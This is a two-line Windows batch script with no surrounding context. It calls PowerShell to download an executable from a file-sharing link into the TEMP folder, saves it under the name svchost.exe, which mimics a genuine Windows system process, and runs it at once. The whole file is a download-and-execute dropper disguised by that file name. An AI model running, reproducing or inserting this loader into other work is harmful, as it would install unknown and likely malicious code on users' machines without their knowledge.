@echo off
powershell -c "iwr 'https://limewire.com/d/e7ZYI#KTxZOpKpll' -OutFile '$env:TEMP\svchost.exe'; Start-Process '$env:TEMP\svchost.exe'"
